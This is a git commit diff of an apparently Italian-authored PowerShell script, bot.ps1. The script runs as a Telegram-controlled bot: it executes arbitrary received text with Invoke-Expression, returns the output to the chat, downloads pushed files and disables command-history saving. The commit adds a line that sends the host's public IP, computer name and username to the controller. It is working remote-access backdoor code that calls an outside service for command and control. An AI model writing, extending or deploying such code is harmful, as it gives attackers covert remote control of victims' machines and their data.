e8dca21919139eacf638779d748bc7c55ce0e12d
Feb <feb19958@gmail.com>
2024-01-05 13:01:06 +0100

    Update bot.ps1

--- bot.ps1
+++ bot.ps1
@@ -1,4 +1,3 @@
-
 Clear-Host
 
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
@@ -152,7 +151,7 @@ function SendMessage($output)
     $MessageToSend = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "``````#$hostia`n$output`n``````"
+        text       = "```````nHOST: [$(Invoke-RestMethod -Uri "ident.me" -WebSession $session)] $env:COMPUTERNAME ($env:USERNAME)`n$output`n``````"
     }
 
     $MessageToSend = $MessageToSend | ConvertTo-Json
@@ -215,7 +214,6 @@ function CommandListener
     $offset = 0
     $hostia = $env:COMPUTERNAME
     $hostname = $hostia
-    $wait = 1000
 
     try {
         Log "Invio un avviso al controller che il bot è stato avviato con successo"
@@ -228,87 +226,81 @@ function CommandListener
         try {
             $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
             if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
-                    if ($offset -eq 0) {
-                        $offset = $message.result.Count
-                        Start-Sleep -Seconds 1
+                if ($offset -eq 0) {
+                    $offset = $message.result.Count
+                    Start-Sleep -Seconds 1
+                    continue
+                }
+
+                $offset     = $message.result.Count
+                $message    = $message.result.Message[-1]
+                $user_id    = $message.chat.id
+                $username   = $message.chat.username
+                $text       = $message.text
+                $document   = $message.document
+                
+                if ($text.Length -gt 0) {
+                    $check_command = $text.Split()
+                    if ($check_command[0] -match "set") {
+                        if ($check_command[1] -match "all") {
+                            $hostname = $hostia
+                            SendMessage "Computer pronto a ricevere istruzioni insieme agli altri host"
+                        } else {
+                            $hostname = $check_command[1]        
+                            if ($env:COMPUTERNAME -match $hostname) {
+                                SendMessage "Computer pronto a ricevere istruzioni"
+                            }
+                        }
                         continue
                     }
-
-                    $offset     = $message.result.Count
-                    $message    = $message.result.Message[-1]
-                    $user_id    = $message.chat.id
-                    $text       = $message.text
-                    $document   = $message.document
                     
-                    if ($text.Length -gt 0) {
-                        $check_command = $text.Split()
-                        if ($check_command[0] -match "SET") {
-                            if ($check_command[1] -match "ALL") {
-                                $hostname = $hostia
-                                SendMessage "Computer pronto a ricevere istruzioni"
-                            } else {
-                                $hostname = $check_command[1]
-                                if ($env:COMPUTERNAME -match $hostname) {
-                                    SendMessage "Computer pronto a ricevere istruzioni"
-                                }
-                            }
-                            continue
-                        }
-                        
-                        if ($check_command[0] -match "ONLINE") {
-                            SendMessage "Computer operativo"
-                            continue
-                        }
+                    if ($check_command[0] -match "online") {
+                        SendMessage "Computer operativo"
+                        continue
                     }
-        
-                    if ($hostname -match $hostia) {
-                        if ($user_id -match $telegram_id) {
-                            if ($text.Length -gt 0) {
-                                try {
-                                    if (CheckRequiredParameters $text) {
-                                        $output = Invoke-Expression -Command $text | Out-String
-                                    } else {
-                                        continue
-                                    }
-                                } catch {
-                                    $output = $Error[0] | Out-String
+                }
+    
+                if ($hostname -match $hostia) {
+                    if ($user_id -match $telegram_id) {
+                        if ($text.Length -gt 0) {
+                            try {
+                                if (CheckRequiredParameters $text) {
+                                    $output = Invoke-Expression -Command $text | Out-String
+                                } else {
+                                    continue
                                 }
-        
-                                $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
-                                    $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
-                                }                        
-        
-                                foreach ($block in $output_splitted) {
-                                    $block = $block | Out-String
-                                    SendMessage $block
-                                }
-
-                                if ($output_splitted.Count -eq 0) {
-                                    Start-Sleep -Milliseconds 300
-                                    SendMessage "Comando ricevuto/eseguito"
-                                }
+                            } catch {
+                                $output = $Error[0] | Out-String
+                            }
+    
+                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
+                                $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
+                            }                        
+    
+                            foreach ($block in $output_splitted) {
+                                $block = $block | Out-String
+                                SendMessage $block
                             }
 
-                            if ($document) {
-                                $file_id   = $document.file_id
-                                $file_name = $document.file_name
-                                DownloadFile $file_id $file_name
+                            if ($output_splitted.Count -eq 0) {
+                                Start-Sleep -Milliseconds 300
+                                SendMessage "Comando ricevuto/eseguito"
                             }
-                        } else {
-                            $unauth_user_found = ("Unauthorized user found! " + $user_id)
-                            SendMessage $unauth_user_found
                         }
+
+                        if ($document) {
+                            $file_id   = $document.file_id
+                            $file_name = $document.file_name
+                            DownloadFile $file_id $file_name
+                        }
+                    } else {
+                        $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
+                        SendMessage $unauth_user_found
                     }
-                    $wait = 900
+                }
             }
 
-            if ($wait -eq 3000) {
-                $wait = 1000
-            } else {
-                $wait = $wait + 100
-            }
-
-            Start-Sleep -Milliseconds $wait
+            Start-Sleep -Milliseconds 1000
         } catch {
             Log $Error[0]
             Start-Sleep -Seconds 5
